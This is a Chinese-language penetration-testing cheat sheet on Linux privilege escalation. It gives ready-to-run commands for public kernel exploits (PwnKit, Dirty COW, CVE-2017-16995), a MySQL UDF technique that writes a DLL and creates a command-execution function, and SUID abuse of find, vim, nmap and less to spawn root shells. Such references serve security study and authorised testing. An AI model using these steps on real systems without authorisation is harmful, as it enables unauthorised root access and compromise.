# 列举常见linux提权方式


# 0x00 信息收集

```shell
lsb_release -a
查看系统发行版本

uname -a
查看内核版本

whoami
检测当前用户权限
```

# 0x01 内核提权

## CVE-2021-4034

pkexec 本地提权

[https://github.com/berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034)

centos和ubuntu通杀

![](https://s2.loli.net/2022/05/03/yWLrg8YFnKu3Bpv.png)

## 脏牛提权-CVE-2016-5195

条件: linux内核=>2.6.22

[https://github.com/FireFart/dirtycow](https://github.com/FireFart/dirtycow)

```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
mv /tmp/passwd.bak /etc/passwd
```

## CVE-2017-16995

影响版本: Linux Kernel Version 4.14-4.4 仅影响Ubuntu/Debian发行版本

[https://github.com/Al1ex/CVE-2017-16995](https://github.com/Al1ex/CVE-2017-16995)

```bash
gcc exploit.c -o exploit
./exploit
```

## LINENUM.SH（本地LINUX枚举和提权辅助脚本）

帮助提取linux系统信息

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

```bash
chmod +x /tmp/LinEnum.sh
sh /tmp/LinEnum.sh &gt; /tmp/getinfo.txt
```

## linux-exploit-suggester2

[https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

帮助查看系统存在的提取漏洞

```bash
perl linux-exploit-suggester-2.pl
```

## kali searchexploit

​	searchsploit是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。

**语法**

> searchsploit [options] term1 [term2] ... [termN]
>
> searchsploit [选项] 关键字1 [关键字2] ... [关键字N]



**选项**

> -c, --case[Term]执行区分大小写的搜索，缺省是对大小写不敏感。
>
> -e, --exact [Term]对exploit标题执行EXACT匹配（默认为AND）
>
> -h, --help在屏幕上显示帮助
>
> -j, --json[Term]以JSON格式显示结果
>
> -m, --mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号
>
> -o, --overflow [Term]Exploit标题被允许溢出其列
>
> -p, --path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号
>
> -t, --title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径）
>
> -u, --update检查并安装任何exploitdb软件包更新（deb或git）
>
> -w, --www [Term]显示Exploit-DB.com的URL而不是本地路径（在线搜索）
>
> -x, --examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用
>
> -v --verbose 显示更多的输出信息
>
> --colour在搜索结果中禁用颜色突出显示.
>
> --id显示EDB-ID值而不是本地路径
>
> --nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）

# 0x02 Mysql提权

前提条件:

> 知道mysql用户名和密码,可以远程执行命令
>
> mysql有写入文件的权限

## 1.查看mysql有写入文件的权限

```sql
show global variables like '%secure%';
```

> secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
> 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
> 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

若secure_file_priv不为空白,可以在mysql/my.ini中修改

```sql
 secure_file_priv = ' '
```

然后重启apache服务



查看plugin位置

```sql
show variables like 'plugin%';
```

查看数据库和服务器架构信息

```sql
select @@version_compile_os, @@version_compile_machine;
```



## 2.上传&写入动态链接库

> 1.Mysql版本大于5.1，plugin文件夹默认不存在，需要自行创建lib/plugin
>
> #若失败，更改my.ini，添加plugin_dir=C:/或者C:/System32
>
> 2.Mysql版本小于5.1：
> 如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。
> 如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。

### 上传

利用sqlmap或者大马直接传输udf.dll,没什么好说的

### 写文件

```sql
create table temp(data longblob);
select 0x0....(16进制字节) INTO DUMPFILE 'C:\\udf.dll';
```

国光师傅已经归纳好了 https://www.sqlsec.com/tools/udf.html

## 3.创建自定义函数

```sql
create table temp(data longblob);
select 0x0.... INTO DUMPFILE 'C:\\udf.dll';
create function sys_eval returns string soname 'udf.dll';   #创建函数sys_eval
select * from mysql.func where name = 'sys_eval';    #查看创建的sys_eval函数
select sys_eval('whoami');       
```

# 0x03 SUID提权

## 1.什么是SUID

SUID(SET UID)是linux的一种特殊权限,当权限为suid的程序作为进程运行时,它的属主不是进程发起者,而是程序文件的所有者.(只针对二进制可执行文件)

比如在非root权限的条件下运行find程序,而find程序的所有者是root,我们就能短暂地执行root的命令,该进程的权限即为root.

```bash
设置SUID
chmod u+s filename   设置SUID位
chmod u-s filename   去掉SUID设置

ls -al               查看文件权限
```

## 2.利用SUID提权

常见的拥有SUID的程序有

> ```
> nmap
> vim
> find
> bash
> more
> less
> nano
> cp
> awk
> ```



查看拥有SUID权限的文件,皆可.

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {};
```

查看文件权限

![](https://s2.loli.net/2022/05/03/WlE8fKQnMkUw2FO.png)

可见,权限为suid且所有者为root

### nmap(2.02~5.02)

早期nmap带有交互模式,运行执行shell命令

```bash
nmap --interactive
nmap> !sh
sh-3.2# whoami
root
```

### find

```bash
touch demo
find demo -exec whoami \;
find demo -exec '/bin/sh' \;
```

### vim

```bash
vim/vi
:shell
```

### less/more

```bash
less /etc/passwd
!/bin/sh
```

### bash

```bash
less /etc/passwd
!/bin/sh
```

### nano

```bash
nano #进入nano编辑器
Ctrl + R
Ctrl + X
即可输入命令
```
